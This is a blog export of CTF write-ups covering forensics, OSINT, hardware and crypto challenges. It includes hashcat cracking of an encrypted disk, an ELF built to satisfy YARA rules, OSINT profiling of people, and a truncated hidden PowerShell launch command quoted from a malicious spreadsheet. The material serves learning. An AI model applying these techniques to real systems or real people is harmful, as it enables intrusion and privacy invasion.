[{"content":"","date":null,"permalink":"/tags/forensics/","section":"Tags","summary":"","title":"Forensics"},{"content":"","date":null,"permalink":"/tags/index/","section":"Tags","summary":"","title":"Index"},{"content":"","date":null,"permalink":"/tags/osint-hw-rf/","section":"Tags","summary":"","title":"OSINT, HW-RF"},{"content":"","date":null,"permalink":"/posts/","section":"Posts","summary":"","title":"Posts"},{"content":"","date":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags"},{"content":"This past weekend my team WolvSec competed in fellow big-10 University of Maryland\u0026rsquo;s CTF and placed 20th! This had a crazy amount of challenges, almost all of which had some pokemon theme, and overall was a lot of fun!\nI solved 16 challenges totaling 4914 points, including all the OSINT, most of the forensics, most of the HW+RF (Hardware and Radio Frequency), and one crypto.\nforensics/Mirror Unknown [298 solves]\nforensics/No. 352 [142 solves]\nforensics/Fire Type Pokemon Only [128 solves]\nforensics/YARA Trainer Gym [82 solves]\nforensics/Telekinetic Warfare [73 solves]\nHW+RF/Bleep1 [91 solves]\nHW+RF/Clutter [53 solves]\nHW+RF/beep-boop [50 solves]\nOSINT/Gone Missing 1 [357 solves]\nOSINT/Gone Missing 2 [256 solves]\nOSINT/Gone Missing 3 [83 solves]\nOSINT/tcc1 [221 solves]\nOSINT/tcc2 [67 solves]\nOSINT/tcc3 [57 solves]\nOSINT/tcc4 [31 solves]\ncrypto/hidden-message [67 solves]\nforensics/Mirror Unknown #Authors: Ishaan514\nPoints: 50\nSolves: 298\nChallenge Description: #I found some unknown symbols in a nearby collapsed cave. Can you figure out what they mean?\n(Note: Ancient civilizations didn\u0026rsquo;t believe in whitespace of lowercase)\nApproach #We can translate the above message, and mirror it, to get the flag Flag: UMDCTF{sinjoh_ruins} forensics/No. 352 #Authors: Angela\nPoints: 410\nSolves: 142\nChallenge Description: #password 1: the name of pokemon #352 in lowercase password 2: timetofindwhatkecleonishiding\nApproach #My teammate Catgut6675 got the first image of keckeon via this stego decoder\nI then saved the image as img.jpg, then ran the following command:\nstegcracker img.jpg wordlist where wordlist contains timetofindwhatkecleonishiding and got the flag!\nFlag: UMDCTF{KECLE0NNNNN} forensics/Fire Type Pokemon Only #Authors: birch\nPoints: 50\nSolves: 128\nChallenge Description: #Some wannabe trainer with no pokemon left their PC connected to the internet. Watch as I hack this nerd lol.\nApproach #We are given a pcap. Dumping the FTP objects, we get a password-protected zip file secret\nFiltering the packets for the FTP stream, we can see the following:\n220 (vsFTPd 3.0.5) USER pokemonfan1 331 Please specify the password. PASS pika We can then use the password pika on the zip file to get the secret (audio warning):\nThere should have been a video here but your browser does not seem\rto support it.\rFlag: UMDCTF{its_n0t_p1kachu!!!} forensics/YARA Trainer Gym #Authors: birch\nPoints: 427\nSolves: 82\nChallenge Description: #My pokemon aren\u0026rsquo;t very strong yet so I need to slip past the sigs written by the 8 YARA gym leaders! Can you help me!!!\nNote: you can run the yara rules locally with yara yara_rules.yar $file\nimport \u0026#34;elf\u0026#34; import \u0026#34;math\u0026#34; rule rule1 { condition: uint32(0) == 0x464c457f } rule rule2 { strings: $rocket1 = \u0026#34;jessie\u0026#34; $rocket2 = \u0026#34;james\u0026#34; $rocket3 = \u0026#34;meowth\u0026#34; condition: all of ($rocket*) } rule rule3 { meta: description = \u0026#34;Number of sections in a binary\u0026#34; condition: elf.number_of_sections == 40 } rule rule4 { strings: $hex1 = {73 6f 6d 65 74 68 69 6e 67 73 6f 6d 65 74 68 69 6e 67 6d 61 6c 77 61 72 65} $hex2 = {5445414d524f434b4554} $hex3 = {696d20736f207469726564} $hex4 = {736c656570792074696d65} condition: ($hex1 and $hex2) or ($hex3 and $hex4) } rule rule5 { condition: math.entropy(0, filesize) \u0026gt;= 6 } rule rule6 { strings: $xor = \u0026#34;aqvkpjmdofazwf{lqjm1310\u0026lt;\u0026#34; xor condition: $xor } rule rule7 { condition: for any section in elf.sections : (section.name == \u0026#34;poophaha\u0026#34;) } rule rule8 { condition: filesize \u0026lt; 2MB and filesize \u0026gt; 1MB } Approach #To solve this challenge, we need to create a file that satisfies all of these conditions.\nRule 1 Create a c++ program that does nothing, and compile\necho -n \u0026#39;int main(){}\u0026#39; \u0026gt; empty.cpp; g++ -o file.elf empty.cpp Rule 2 \u0026amp; 7 Add section poophaha which contains the three strings\necho -n \u0026#34;jessiejamesmeowth\u0026#34; \u0026gt; temp.bin objcopy --add-section poophaha=temp.bin file.elf Rule 4 Add hex strings 3 \u0026amp; 4 to the elf\nperl -e \u0026#39;print pack \u0026#34;H*\u0026#34;, \u0026#34;696d20736f207469726564736c656570792074696d65\u0026#34;\u0026#39; \u0026gt; temp.bin objcopy --add-section hex=temp.bin file.elf Rule 6 We can simply just add this string to another section in the elf\necho -n \u0026#39;aqvkpjmdofazwf{lqjm1310\u0026lt;\u0026#39; \u0026gt; temp.bin objcopy --add-section xor=temp.bin file.elf Rule 5 \u0026amp; 8 We need this elf to be a size between 1-2 MB, and have sufficient entropy. We can add a section that fulfills this\ndd if=/dev/urandom of=temp.bin bs=1024 count=1024 objcopy --add-section random=temp.bin file.elf Rule 3 Add the remaining empty X sections\nfor i in {1..X}; do objcopy --add-section empty$i=/dev/null file.elf done Combining everything, we can create the file with the following commands:\necho -n \u0026#39;int main(){}\u0026#39; \u0026gt; empty.cpp; g++ -o file.elf empty.cpp; echo -n \u0026#34;jessiejamesmeowth\u0026#34; \u0026gt; total.bin; perl -e \u0026#39;print pack \u0026#34;H*\u0026#34;, \u0026#34;696d20736f207469726564736c656570792074696d65\u0026#34;\u0026#39; \u0026gt;\u0026gt; total.bin; echo -n \u0026#39;aqvkpjmdofazwf{lqjm1310\u0026lt;\u0026#39; \u0026gt;\u0026gt; total.bin; dd if=/dev/urandom bs=1024 count=1024 \u0026gt;\u0026gt; total.bin; objcopy --add-section poophaha=total.bin file.elf; for i in {1..9}; do objcopy --add-section empty$i=/dev/null file.elf done Then we can submit the file and take down all the gym leaders! Flag: UMDCTF{Y0ur3_4_r34l_y4r4_m4573r!} forensics/Telekinetic Warfare #Authors: birch\nPoints: 442\nSolves: 73\nChallenge Description: #Someone was able to exfil a top secret document from our airgapped network! How???\nApproach #We can extract each frame of the GIF, read the QR code data, and convert from b64 with the following script:\nimport imageio from pyzbar.pyzbar import decode from PIL import Image import base64 # get image frames gif_file = \u0026#34;bruh.gif\u0026#34; reader = imageio.get_reader(gif_file) # create string for data qr_data = b\u0026#34;\u0026#34; # iterate through each frame and extract the QR code data for frame in reader: decocdeQR = decode(frame) qr_data += base64.b64decode(decocdeQR[0].data.decode(\u0026#39;ascii\u0026#39;)) # write the bytes to a file with open(\u0026#34;output\u0026#34;, \u0026#34;wb\u0026#34;) as f: f.write(qr_data) From this, we get the following document Flag: UMDCTF{wh0_n33d5_k1net1c_w4rfar3_anyw4ys}\nHW+RF/Bleep1 #Authors: gary\nPoints: 409\nSolves: 91\nChallenge Description: #Toss the flag.enc contents into the ROM and press play :)\nApproach #All we have to do for this is open up logisim-evolution (not logisim!), fill in the rom with the hex given, and run the program!\nFlag: UMDCTF{w3lc0me_t0_l0g1s1m_yeet}\nHW+RF/Clutter #Authors: busescanfly\nPoints: 470\nSolves: 53\nChallenge Description: #I wrote this machine code but Giovanni wiped my memory! I\u0026rsquo;m all scatter-brained and can\u0026rsquo;t remember where I wrote the flag to :(\nvesp\nApproach #When we run clutter.vsp on verbose output, we can see the output looks something like this:\n*************Begin[Machine Level]***************** A = 0052, B = 0003, Z = 0, S = 0, C = 0, F = 0 MAR = 0008, PC = 000A, IR = 2000, reset = 0 add = 0 complement = 0 Memory[0000] = 0052 *************End[Machine Level]*****************Machine Cycle 0005: PC = 000A, FETCH SUBCYCLE MAR = 000A, IR = 0000, Clock cycle = E DECODE SUBCYCLE Decoded instruction is: ADD Clock cycle = E EXECUTE SUBCYCLE Clock cycle = F *************Begin[Machine Level]***************** A = 0055, B = 0003, Z = 0, S = 0, C = 0, F = 0 MAR = 000A, PC = 000B, IR = 0000, reset = 0 add = 1 complement = 0 Machine Cycle 0006: PC = 000B, FETCH SUBCYCLE MAR = 000B, IR = 315B, Clock cycle = 11 DECODE SUBCYCLE Decoded instruction is: MOV Clock cycle = 11 EXECUTE SUBCYCLE Clock cycle = 13 *************Begin[Machine Level]***************** A = 0055, B = 0003, Z = 0, S = 0, C = 0, F = 0 MAR = 000B, PC = 000D, IR = 315B, reset = 0 add = 0 complement = 0 Memory[015B] = 0055 *************End[Machine Level]*****************Machine Cycle 0007: PC = 000D, With the first few memory writes looking as such:\nMemory[0000] = 0000 Memory[0001] = 0000 Memory[0001] = 0003 Memory[0000] = 0052 Memory[015B] = 0055 Memory[0001] = 0008 Memory[0000] = 0045 Memory[0285] = 004D Memory[0001] = 0003 Memory[0000] = 0041 Memory[0185] = 0044 Memory[0001] = 0006 Memory[0000] = 003D Memory[022A] = 0043 Memory[0001] = 0009 From the challenge description, we know the program is writing the flag to random memory addresses. We can see that pattern in the above memory writes.\nSo we can write a command to obtain all the memory writes, exclude Memory[0000] and Memory[0001] writes, get the last two bytes of hex on each line, and convert to ASCII!\ncat output | grep \u0026#39;Memory\u0026#39; | awk \u0026#39;!/Memory\\[000[01]\\]/\u0026#39; | sed \u0026#39;s/.*= 00//\u0026#39; | xxd -r -p Flag: UMDCTF{Ux13-us3-m3m0ry-w1p3!}\nHW+RF/beep-boop #Authors: Assgent\nPoints: 473\nSolves: 50\nChallenge Description: #\u0026ldquo;Oh why didn\u0026rsquo;t I just choose Computer Science??\u0026rdquo; -Every Computer Engineering major\n%Build script to beep-boop (UMDCTF2023, author: Assgent) %{ A flag was encoded into a sound file using the script below. Analyze the script and reverse-engineer the flag! %} close clear all flag = fileread(\u0026#34;flag.txt\u0026#34;); Fs = 8192; sound = string_to_sound(flag, Fs, 1, 0.5); sound_normalized = sound / (max(abs(sound))); audiowrite(\u0026#34;sound.wav\u0026#34;, sound_normalized, Fs); function freq = get_frequency_1(char) freq = char * 13; end function freq = get_frequency_2(char) freq = (char - 50) * 11; end % Fs is the samples/sec. % T is the duration of each key. (in seconds) % Tpause is the pause between keys. (in seconds) function x = string_to_sound(keys,Fs,T,Tpause) t = (0:fix(T*Fs)).\u0026#39;/Fs ; zp = zeros(fix(Tpause*Fs/2),1) ; x = []; for r = 1:length(keys(:)) char = keys(r); x = [x ; zp ; cos(2*pi*get_frequency_1(char)*t) + cos(2*pi*get_frequency_2(char)*t) ; zp]; end end Your browser does not support the audio element.\rApproach #This solution will present a bit of a cheese. We can build a MATLAB solution using a fast fourier transform with the help of GPT as such:\n% read in file [sound, Fs] = audioread(\u0026#39;sound.wav\u0026#39;); % parameters T = 1.1; Tpause = .4; % loop over keys and write char to array i = 1; flag = \u0026#39;\u0026#39;; while i \u0026lt;= length(sound) - 60 % Extract the current key key = sound(i:i+round(T*Fs)); i = i + round((T+Tpause)*Fs); % compute spectrum of the key N = length(key); Y = fft(key)/N; f = Fs*(0:(N/2))/N; P = abs(Y(1:(N/2+1))); % find two frequencies [~, idx1] = max(P); f1 = f(idx1); P(idx1) = 0; [~, idx2] = max(P); f2 = f(idx2); % decode char and add to flag char = round(((f1/13) + (f2/11 + 50))/2); flag = [flag, char]; end % Display the decoded message disp(flag); This results in the following string, whose length we know is accurate:\nUMICTK{it_ tz_ahtzaqq _jsjt _sigsaq_prthjssisg_???} Messing with the parameters, we can also get this string\nUUMIICYYK{{ioo_yyouu_aacyyuaaqqqy__essoooy__siigssaqq_uuwooceesssissg__????}} Therefore the solution is pretty easy to figure out even if we didn\u0026rsquo;t decode it right 100%\nFlag: UMDCTF{do_you_actually_enjoy_signal_processing_???}\nOSINT/Gone Missing 1 #Authors: gary\nPoints: 50\nSolves: 357\nChallenge Description: #A fire type Pokemon has gone missing. Can you find it?\nApproach #For these challenges, we are given a 360 degree view of a google street view location, and asked to identify it\nPerforming a reverse image search on google images, we can see immediately that this is Oslo Royal Palace, Norway\nLocation\nFlag: idk_rn_infra_taken_down\nOSINT/Gone Missing 2 #Authors: gary\nPoints: 50\nSolves: 256\nChallenge Description: #A grass type Pokemon has gone missing. Can you find it?\nApproach #This challenge was not as straightforward. It appeared at first glance to be somewhere in the US based on the flag, landscape, and large parking lots.\nEventually, via reverse image searching the landscape through google images, and checking locations it presents, we find that the location is Castle Rock, CO\nLocation\nFlag: idk_rn_infra_taken_down\nOSINT/Gone Missing 3 #Authors: gary\nPoints: 425\nSolves: 83\nChallenge Description: #A water type Pokemon has gone missing. Can you find it?\nApproach #The first step for these OSINTs for me is identifying the country, since there\u0026rsquo;s a lot of clues that can help with that.\nFor this, we can see a striped pole extended all the way down, which is very common to Taiwan. This plus the rice paddy fields helped confirm this. My next step was using the poster to somehow zero us in on the location or region within Taiwan.\nTranslating the image we can see \u0026ldquo;Unlin\u0026rdquo;\nI spent a while prior to this trying to car-meta by looking for locations in Taiwan where the car, when pointing the camera straight down, was the same. One of these locations I found where the car was very, very similar was in Yunlin County.\nFrom there, I figured it was enough to find the location. Other people used poles to narrow it down exactly.\nWhat I did was this this:\nAlign the compass exactly north Get the approximate orientation of the road in my head to match for on google maps Look for where there is a straight line with a bend to the same direction as seen in the panorama Look for rural areas where terrain is very flat, since there are no hills in the panorama From this, the location became much easier to find a match from above:\nLocation\nFlag: idk_rn_infra_taken_down\nOSINT/TCC1 #Authors: gary\nPoints: 50\nSolves: 221\nChallenge Description: #I found this hacker group and they\u0026rsquo;re acting kinda strange. Let\u0026rsquo;s do some diggin\u0026rsquo;. Maybe we can find their discord server? I thought they linked it on their website before\u0026hellip;\nhttps://tcc.lol\nApproach #We can use the Wayback Machine to get the discord link\nFrom there, the flag is in #general\nFlag: UMDCTF{w3lc0me_t0_th3_b35t_d!sc0rd_982364}\nOSINT/TCC2 #Authors: gary\nPoints: 451\nSolves: 67\nChallenge Description: #What is that secret page on their website?\ntcc.lol\nApproach #There is a page titled secret which asks 4 questions\nQuestion 1: What place did TCC get in their most recent CTF competition?\nSearching for \u0026ldquo;the charizard collective\u0026rdquo; we can find their CTF team and see that they placed 145 in DawgCTF 2023\nQuestion 2: Which company is p1ku currently working for?\nI initially found p1ku\u0026rsquo;s twitter when searching for TCC. We can see this tweet made by them:\nLooking up their email on Google, a link to their resume shows up:\nIn this resume we can see their prior work experience is Leidos:\nProfessional Experience Security Analyst, Leidos (August 2020 - Present) Question 3: What is bree’s favorite CTF category?\nFrom the discord we know they like misc challenges Question 4: What is the brand name of the gift that blub is going to buy?\nIn discord there is a debate about what to get Bulberina and p1ku mentions there being a list.\nVia reverse email search on epios, we know bulb has an amazon account with that email. I started looking at lists for bulberina but found no results.\nThen I discovered there is a separate listing for weddings, and there we find a result for Bulberina Asaur\nFrom bulb\u0026rsquo;s message on discord, we know they got bulberina a storage container\nOn the list we can see Shazo storage:\nWith all those answers, we can access the secret page to get the flag\nFlag: UMDCTF{y0u_sur3_kn0w_h0w_t0_d0_y0ur_r3s3@rch_289723}\nOSINT/TCC3 #Authors: gary\nPoints: 465\nSolves: 57\nChallenge Description: #I\u0026rsquo;m missing contact information for one of the members. They said they were Out of Office (OOO) on vacation.\nApproach #Out Of Office (OOO) means that someone is away for a while, and most people configure their emails to automatically respond when they\u0026rsquo;re OOO.\nFrom the past formats of the emails it is reasonable to think mach0, who is the only one without an email listed, would also have an email in the format name.umdctf2023@gmail.com\nEmailing mach0.umdctf2023@gmail.com results in the following response:\nCalling the number 281-698-0109 gives the flag (after trying to painfully transcribe it -_-)\nYour browser does not support the audio element.\rFlag: UMDCTF{y0u_h4v3_r3ach3d_mach0_v01cema1l_333}\nOSINT/TCC4 #Authors: gary\nPoints: 490\nSolves: 31\nChallenge Description: #mach0 told me he has been tweeting a lot and might expose TCC secrets!\nApproach #In discord, mach0 signs all their messages with - macho\nMost of the messages from mach0 were edited, and I figure this was the challenge author creating the last challenge and appending - macho to each message.\nTwitter does not allow including the dash in the advanced search, so the only string for sure was macho. I tried including other terms but those yielded no results.\nI ended up having to search \u0026lsquo;macho\u0026rsquo; and scroll through many\u0026hellip;questionable results to find mach0\u0026rsquo;s account.\nOne of mach0\u0026rsquo;s tweets has a pastebin which contains the flag Flag: UMDCTF{tw1tt3r_adv4nc3d_s3arch_y0ink}\ncrypto/Hidden Message #Authors: SillyLily\nPoints: 451\nSolves: 67\nChallenge Description: #Can you find the hidden message?\nHINT: The delimiter is a space\nNOTE: Wrap the result in UMDCTF{}\nGO CATCH tHe bug parAS! AbRa LIKES His speED! GO catCH zubaT Or not! like paraS cutE zUBAT Is FUn! hes GREAT! GO CATch RoCk onix! onIx LOVes My new mATTE rocKS lol! Approach #Since the delimiter is a space, each section of the text prior to the ! is a word, unless the flag is 7 characters but that seemed unlikely\nI then figured each word must be a character, and attempted to translate the text into morse code where uppercase is - lowercase is . and ! is /\nFlag: UMDCTF{M0RS3_C0D3_M34NS_H4V1NG_S0_M8CH_F8NS13S}\nHope you enjoyed the writeups :D and thanks to UMD for hosting a great CTF!!\n","date":"4 May 2023","permalink":"/posts/umd-ctf-2023/","section":"Posts","summary":"\u003cp\u003eThis past weekend my team WolvSec competed in fellow big-10 University of Maryland\u0026rsquo;s CTF and placed 20th! This had a crazy amount of challenges, almost all of which had some pokemon theme, and overall was a lot of fun!\u003c/p\u003e\n\u003cp\u003eI solved 16 challenges totaling 4914 points, including all the OSINT, most of the forensics, most of the HW+RF (Hardware and Radio Frequency), and one crypto.\u003c/p\u003e","title":"UMD CTF 2023"},{"content":" ctf player and security nerd new website still work in progress :)\n","date":null,"permalink":"/","section":"Welcome to Congo! 🎉","summary":"ctf player and security nerd new website still work in progress :)","title":"Welcome to Congo! 🎉"},{"content":"This was a great CTF hosted by ACM Cyber and Psi Beta Rho at UCLA. My team WolvSec finished in 20th place out of 980 teams, and solved 35/46 challenges. I\u0026rsquo;ll be going over the 3 misc challenges that I solved for our team.\nmisc/hike to where? [209 solves]\nmisc/discord l34k [142 solves]\nmisc/a hacker\u0026rsquo;s notes [43 solves]\nmisc/hike to where? #Authors: burturt\nPoints: 353\nSolves: 209\nChallenge Description: #Where was this photo taken? I think it used to be in the original photo, but someone cropped it out!\nThe flag is lactf{location}, where location is the name of the POI that this person hiked up to, all lowercase and replacing spaces with underscrolls. Use the google maps name of the POI: for example, if the solution is the UCLA Bruin Bear statue, this is the google maps location, and the flag would be lactf{bruin_statue}.\nPlease note: contacting anyone or any organization beyond official LA CTF support channels regarding this challenge is against the rules. Please be respectful of those who are involved in this challenge.\nApproach #We are given this image of someone who looks like they hiked up a mountain, and also is part of computer science at UCLA. My first step was figuring out who this was, so just did a quick google search for \u0026ldquo;Computer science professors at UCLA\u0026rdquo;\nOne of the first things I found is a Quora article about him. So once I have the name I just google it, and then found his rock climbing website off that. Helped to confirm it was the same guy.\nI tried searching some of the mountains listed on Google Maps, but to no avail. I realized he didn\u0026rsquo;t have hiking gear though unlike a lot of the photos on his website, but instead a UCLA T Shirt, signifying it could be a university trip. I came across peaksandprofessorsucla.org which is a group of students at UCLA and professors. I looked at the blog posts with Carey Nachenberg, and found one about a trip to Skull Rock.\nI didn\u0026rsquo;t really know if this was the exact place or not, but I went ahead and submitted that as the flag anyway and was correct! Anyways this was a weird OSINT challenge because I haven\u0026rsquo;t had to deal with googling an actual person in a CTF, before this is more applicable to real world OSINT I guess?\nFlag: lactf{skull_rock} misc/discord l34k #Authors: burturt\nPoints: 410\nSolves: 142\nChallenge Description: #My friend sent me this message link that apparently links to a \u0026ldquo;flag\u0026rdquo;, but discord says \u0026ldquo;You don\u0026rsquo;t have access to this link\u0026rdquo;! They did mention something about them being able to embed a list of online users on their own website, and sent me this image. Can you figure out how to join the server?\nNote: Discord phone verification is NOT required for this challenge.\nApproach #I first started looking at the message link to see what I could do with that\nhttps://discord.com/channels/1060030874722259057/1060030875187822724/1060031064669700186 From messing around with other message links that I created, I noticed having the first number of the message link only, so https://discord.com/channels/1060030874722259057 for example, would take you to the server it belonged to only if you are a member. From more research I discovered that this was the server ID.\nOk cool, but how do we join a server with this? Well after more research I stumbled across this Reddit post that just so happens to explain what to do when a widget is enabled, and you have the server ID.\nUsing this the link would be:\nhttps://discord.com/widget?id=1060030874722259057 And this Works! We can see here that the widget looks the same as the one pictured.\nFrom that we hit join, and we get the flag!\nFlag: lactf{D15C0rD_W1D6375_134K_1NV1735}\nmisc/a hacker\u0026rsquo;s notes #Authors: burturt\nPoints: 478\nSolves: 43\nChallenge Description: #We managed to get ahold of a flash drive which we think contains the decryption keys for the ransomware that a hacker group tried to deploy on our computer network! However, it seems like the hacker encrypted the flash drive. We know that the organization uses passwords in the format hacker### (hacker + 3 digits) for their disks, but a much stronger encryption password once you login. Can you try to get access to their notes?\nApproach #So we are given a dd file, which should be a disk image file. To check, we can run the file command.\n┌──(kali㉿kali)-[~/Downloads/hackers-drive] └─$ file hackers-drive.dd hackers-drive.dd: LUKS encrypted file, ver 1 [twofish, cbc-plain, sha1] UUID: 456aa573-ab59-4146-a2f3-874a808b9c08 This drive appears to be encrypted, which is also told by the challenge description. However, we know there are only 1000 variations. We can write a quick python script that outputs all of these:\nfor (char1) in range (10): for (char2) in range (10): for (char3) in range (10): print(\u0026#34;hacker\u0026#34; + str(char1) + str(char2) + str(char3)) We can crack this LUKS encrypted file with hashcat as follows:\n┌──(kali㉿kali)-[~/Downloads/hackers-drive] └─$ hashcat -m 14600 -a 0 -w 3 hackers-drive.dd wordlist.txt hashcat (v6.2.5) starting ... Approaching final keyspace - workload adjusted. hackers-drive.dd:hacker765 Session..........: hashcat Status...........: Cracked Hash.Mode........: 14600 (LUKS) Hash.Target......: hackers-drive.dd Time.Started.....: Sun Feb 12 20:49:18 2023 (1 sec) Time.Estimated...: Sun Feb 12 20:49:19 2023 (0 secs) Kernel.Feature...: Pure Kernel Guess.Base.......: File (wordlist.txt) Guess.Queue......: 1/1 (100.00%) Speed.#1.........: 1953 H/s (9.55ms) @ Accel:512 Loops:1024 Thr:1 Vec:8 Recovered........: 1/1 (100.00%) Digests Progress.........: 1000/1000 (100.00%) Rejected.........: 0/1000 (0.00%) Restore.Point....: 0/1000 (0.00%) Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:1024-1085 Candidate.Engine.: Device Generator Candidates.#1....: hacker0 -\u0026gt; hacker999 Hardware.Mon.#1..: Util: 38% Cool! Hashcat told us that the password for the encrypted drive is hacker765. From this we can run cryptsetup to decrypt the drive, then just double click the output and kali will mount it for us!\n┌──(kali㉿kali)-[~/Downloads/hackers-drive] └─$ sudo cryptsetup open --type luks hackers-drive.dd hackers-drive Enter passphrase for hackers-drive.dd: [ENTER hacker765 HERE] Alright, let\u0026rsquo;s see what we have. Upon entering the drive we see some text files that contain command history and other important notes.\nInside .bash_history we see:\njoplin cd .config/joplin ls -lah sqlite3 database.sqlite ls ls -lah cat database.sqlite | grep lactf cd .. cd .. ls ls -lah nano note_to_self.txt ls -lah ls zerofree /dev/mapper/notes exit Ok so we are dealing with notes being taken on Joplin, an open source note-taking app. joplin initializes the notebook and .config folder, and our hacker here then enters the database that joplin uses. We can see their edit history in the .sqlite_history file:\n.tables select * from notes; select * from *; select * from notes_fts; select * from qexit exit .exit ; exit ; .exit .tables select * from notes; delete from notes; select * from notes; ... select count(*) from notes; vacuum; .exit .exit pragma secure_delete; select * from notes_normalized; delete from notes_normalized; select * from notes_normalized; vacuum; .exit Looks like they are deleting their notes from the database, as hackers do. They nicely lay out their process in the note_to_self.txt file:\nNote to self: delete notes and notes_normalized tables in .config/joplin/database.sqlite when not in use; allow encrypted sync to restore notes after This matches up with the history files we just looked at, where the hacker is creating notes, then erasing them. Also shown by zerofree /dev/mapper/notes. Now time to figure out how to get these notes back! One of the first things I tried was just cat database.sqlite | grep -a 'lactf' in the .config folder, and we get this:\n┌──(kali㉿kali)-[/media/kali/ed1c79a8-8148-4ce2-b482-91334a211dc9/.config/joplin] └─$ cat database.sqlite | grep -a \u0026#39;lactf\u0026#39; 3ncryp71onc4ch3dinfolactf p422word2s3cur3ecert�n0 113 3ncryp71onc4ch3dinfolactf p422word2s3cur3ecertyo40 20infosec@0 26infosecert Interesting. This looks somewhat like the flag format? I tried for a while to rearrange this into something like lactf{p422word_2_s3cur3_your_3ncryp71on_c4ch3d_info}. But no flag :( wasn\u0026rsquo;t going to be this easy. After more checking I discovered this was just some residue data that comes from creating a note that the database saved, but the capitalization and punctuation is not correct. But hey! We know the flag is here assuming this isn\u0026rsquo;t bait.\nLet\u0026rsquo;s take a look at that encrypted-notes folder:\nWe see here two markdown files and info.json This json file contains encryption of the master keys. According to Joplin\u0026rsquo;s E2EE Spec the master keys are themselves encrypted.\nThe markdown files look like such:\nid: f6fdd827811741a5b8b796b7778b2f4b created_time: updated_time: 2023-01-16T01:07:30.122Z user_created_time: user_updated_time: encryption_cipher_text: JED01000022057fc1b793673943df83c6d6ef862416250002d0{\u0026#34;iv\u0026#34;:\u0026#34;EJ1h/RpLa3kHQshwbAzg/w==\u0026#34;,\u0026#34;v\u0026#34;:1,\u0026#34;iter\u0026#34;:101,\u0026#34;ks\u0026#34;:128,\u0026#34;ts\u0026#34;:64,\u0026#34;mode\u0026#34;:\u0026#34;ccm\u0026#34;,\u0026#34;adata\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;cipher\u0026#34;:\u0026#34;aes\u0026#34;,\u0026#34;salt\u0026#34;:\u0026#34;t+kHfSSLUOk=\u0026#34;,\u0026#34;ct\u0026#34;:\u0026#34;8rNT3WgTYYHbeXFvYNiebAD1Lz0lcmMBGjVoEe2vic0sTV8nzUUmP1gBVA/R7oCyOQLbcGrXc1hl1amvVE/Lln8erhqi1+tje9Amx+0tZPcwpQKiIht2hQmCqzBbCEYQ9f0OjFS01wJTTPl9M9PgIRc2eNvmN5VYCOiq3TqHOeBgiiyKFhXTd/1Xpbv++Y58M9Nombzmx3lRujjF2LAKUaYnO33BRQ7EJoadjqNE0PBNeMvZRBxsdt2Y2VmV3evWkA8htlf5R/Zhe8Di4CPupFJgBDF2j9P7R27f3UcrWzauqlLi4BfSjYggTQGe0YdxOJxHxXZIZX0KHqsTtpYXZDgnj0g4AkxDVBQhxJVQObdo/u8JUQofHLCZyyD2pn8A6cYF7QbItz3J9flQVtZw59UtLq2Oiip6OCWj75xLy48EqEtUjQsXY5AidrCR36S7fPsVilSCXBWX6x+43xArg+rMCAnColo+0XW/Beu+OHUPEkUl60pvuPcwiVo2tmR3Niiq+M2Fy+dpYfdH7pCqnIdKOJCrm/MGKGJyLYjlwYqhXwoKs32tVsNyhxFl1c3feZwCOw==\u0026#34;} encryption_applied: 1 parent_id: is_shared: share_id: master_key_id: icon: type_: 2 With the other file having the header:\nid: b692aaeaf3494fa29121524802940dc2 parent_id: f6fdd827811741a5b8b796b7778b2f4b As well as a similar body. This indicates that this file likely is a note as part of the parent notebook.\nI first tried to decrypt this with this SJCL demo that\u0026rsquo;s the same scheme Joplin uses, as per the spec.\nBut what password do we use to decrypt these encrypted notes? That comes to the second part of the challenge description, where there\u0026rsquo;s a much stronger encryption password once you login. Well the master password is actually stored in cleartext in the database file!\nI tried using variations of this and the password found in info.json (which is also in syncInfoCache in the database) on the SJCL demo website, but to no avail. This is probably possible, but why make this harder than it needs to be? Let\u0026rsquo;s just download our own version of Joplin and replace the database file! Swapping out important parameter values should also work, like the syncInfoCache, encryption.masterPassword, and sync_items.\nOnce you\u0026rsquo;re in Joplin make sure the Encryption Keys look as such:\nThen, make sure the Synchronization target is on the file system and pointed to the encrypted-notes folder, or a copy of it.\nAfter all this is done, select the Delete local data and re-download from sync target to sync the new data into Joplin!\nThere we go! We can see the secert info that the hacker was keeping from us.\nFlag: lactf{S3cUr3_yOUR_C4cH3D_3nCRYP71On_P422woRD2}\nThoughts #This challenge was a good one, and took up a lot of my time this CTF. I learned a lot about the importance of documenting your findings, considering every clue thrown at you without falling into rabbit holes of overthinking, and ensuring integrity of the files for data you\u0026rsquo;re given. Trying to sync the encryption notes should have been more of a priority in retrospect, instead of trying to decipher the encryption files manually.\n","date":"18 February 2023","permalink":"/posts/la-ctf-2023/","section":"Posts","summary":"\u003cp\u003eThis was a great CTF hosted by ACM Cyber and Psi Beta Rho at UCLA. My team WolvSec finished in \u003cstrong\u003e20th\u003c/strong\u003e place out of \u003cstrong\u003e980\u003c/strong\u003e teams, and solved \u003cstrong\u003e35/46\u003c/strong\u003e challenges. I\u0026rsquo;ll be going over the 3 \u003cstrong\u003emisc\u003c/strong\u003e challenges that I solved for our team.\u003c/p\u003e","title":"LA CTF 2023"},{"content":"","date":null,"permalink":"/tags/osint/","section":"Tags","summary":"","title":"OSINT"},{"content":"*Was in 2023, not 2022 since event delayed. Great CTF with a lot of challenges from the team idek ¯_(ツ)_/¯. My team WolvSec came in 17th out of 846 teams. I will be going over my 2 Forensics solves and 5 OSINT. Currently just Forensics 1, I plan to add the rest later!\nHiddenGem Mixtape 1: Initial Access #Authors: Bquanman\nPoints: 478\nSolves: 47\nChallenge Description: #We\u0026rsquo;re pretty sure there\u0026rsquo;s been a hack into our system. The incident is suspected to be caused by an employee opening a document file received via email even though he deleted it shortly afterwards. We managed to do a logical acquisition of data from his hard drive. However, when we open the document file, it looks empty, can you analyze what it contains?\nApproach #We are given a .vhdx file, which contains a Windows Image. To open in Autopsy, I double clicked the file on my Windows machine and imported that disk image. The first thing that struck my eye when doing this was the email saved onto the machine.\nThe email HTML gives us the password Privacy4411@2023!!!. This can be used to open the attachment in the email, which gives us a file Policy.xlsx. In this file my teammates and I tried to find anything meaningful, even performing stego on the image of Tommy Xiaomi but with no success. I noticed a weird line on page 3, which was hidden, but it did not show correct output on google sheets since the file was converted. However, doubledelete was able to view the line\nCMD.EXE /c powershell.exe -w hidden $e=(New-Object 